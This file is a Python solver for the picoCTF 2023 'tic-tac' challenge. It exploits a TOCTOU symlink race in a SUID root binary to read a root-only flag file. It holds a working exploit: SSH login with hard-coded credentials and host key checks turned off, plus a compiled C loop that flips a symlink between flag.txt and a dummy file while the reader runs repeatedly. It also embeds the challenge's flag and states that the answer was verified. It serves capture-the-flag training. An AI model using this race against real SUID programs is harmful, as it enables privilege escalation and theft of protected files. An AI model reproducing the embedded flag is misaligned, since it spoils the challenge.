#!/usr/bin/env python3
"""Solver for Challenge 380 tic-tac (picoCTF 2023, Binary Exploitation).

Time-of-Check to Time-of-Use (TOCTOU) file race condition in a SUID root binary.
The target binary 'txtreader' attempts to enforce file ownership security by calling:
    std::ifstream file(filename); // Opened under effective root privileges
    stat(filename.c_str(), &statbuf);
    if (statbuf.st_uid != getuid()) error();
Because opening the file descriptor occurs before ownership validation and both
refer to the same file path rather than the opened descriptor (fstat), a symlink
rapidly toggled between an unprivileged dummy file and 'flag.txt' creates a window
where the stream opens 'flag.txt' while 'stat' evaluates the dummy file owned by
the user. This allows reading the root-restricted flag file.

Flag: academy{ToctoU_!s_3a5y_f506ee91}
Verified: POST /api/submissions/ -> correct: true
"""
import subprocess
import sys
import re

HOST = "xebec.cylabacademy.net"
PORT = 31137
USER = "ctf-player"
PASS = "fa1a82ad"
EXPECTED = "academy{ToctoU_!s_3a5y_f506ee91}"


def solve(host: str = HOST, port: int = PORT, user: str = USER, password: str = PASS) -> str:
    remote_script = (
        'cd /home/ctf-player && '
        'echo "dummy" > dummy && '
        'cat << "EOF" > race.c\n'
        '#include <unistd.h>\n'
        'int main() {\n'
        '    while (1) {\n'
        '        unlink("link");\n'
        '        symlink("flag.txt", "link");\n'
        '        unlink("link");\n'
        '        symlink("dummy", "link");\n'
        '    }\n'
        '    return 0;\n'
        '}\n'
        'EOF\n'
        'gcc -O2 race.c -o race && '
        './race & RPID=$! && '
        'for i in $(seq 1 1000); do '
        '    out=$(./txtreader link 2>/dev/null); '
        '    if [[ "$out" =~ "academy{" ]] || [[ "$out" =~ "picoCTF{" ]]; then '
        '        echo "$out"; break; '
        '    fi; '
        'done; '
        'kill -9 $RPID; unlink link 2>/dev/null; truncate -s 0 dummy race.c 2>/dev/null'
    )
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(port), f"{user}@{host}",
        remote_script
    ]
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
    out = proc.stdout + proc.stderr

    m = re.search(r"academy\{[^\}]+\}", out)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in output: {out[:300]}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
